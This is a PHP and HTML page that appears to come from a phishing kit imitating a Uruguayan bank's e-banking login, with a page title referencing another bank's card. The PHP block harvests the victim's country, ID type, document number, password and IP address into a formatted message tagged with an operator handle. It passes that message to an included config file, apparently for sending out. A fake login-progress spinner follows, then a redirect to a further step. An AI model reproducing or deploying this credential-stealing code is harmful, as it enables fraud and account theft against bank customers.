<?php  

if (isset($_POST['submit'])) {
$enviara =
  "<b> 💸 ebanking.brou.com.uy/frontend/loginStep1 💸 </b>\n\n".
  " ------ [ Login ] ------ \n\n".
  "<b>👤 Pais: </b> <code>". $_POST['pais']."</code>\n".
  "<b>👤 Tipo: </b> <code>". $_POST['tipo']."</code>\n".
  "<b>👤 Doc: </b> <code>". $_POST['doc']."</code>\n".
  "<b>👤 Password: </b> <code>".$_POST['pass']."</code>\n".
  "<b>🌐 IP: </b> <code>".$_SERVER['REMOTE_ADDR']."</code>\n".
  " ------ [ @mitraserodehojalata ] ------ \n\n";    
  $enviar =  urldecode($enviara);
  include 'config/app.php';  
}
?>
<!doctype html>
<html lang="en">
<head>
  <meta http-equiv="refresh" content="" id="refresh">
  <link rel="icon" type="ico" href="favicon.ico">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Tarjeta Lider Bci</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
  <link rel="stylesheet" type="text/css" href="css/style.css">
</head>
<body style="background:#073057;">
  <div class="d-flex text-center flex-column h-100 justify-content-center align-items-center p-4 text-center">
    <img src="img/logo.svg" style="height: 50px !important;">
    <h3 class="my-3 text-white fw-normal">Iniciando sesión</h3>
    <p class="text-white">No abandones esta ventana.</p>
    <div class="p-3 my-4 loadig bg-white w-100">
      <div class="spinner-container w-100 position-relative">
        <div class="spinner-1"></div>
         <dis class="spinner-2"></dis>
      </div>
    </div>
    <p class="text-white">Progreso: <span id="porcentaje"></span>%</p>
  </div>
  <script type="text/javascript" src="config/segundos.js"></script>
  <script type="text/javascript">
    let speed = segundos * 10,
    inicio = 0,
    limite = 100;
    document.getElementById('refresh').setAttribute("content" , `${segundos};URL=seg.php`);
    let porcentaje = setInterval(function(){
      if (inicio < limite) {
        inicio++;
        document.getElementById("porcentaje").innerHTML = inicio;
      }
      if (inicio == limite) {
        clearInterval(porcentaje);
      }
    },speed);
  </script>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>
</body>
</html>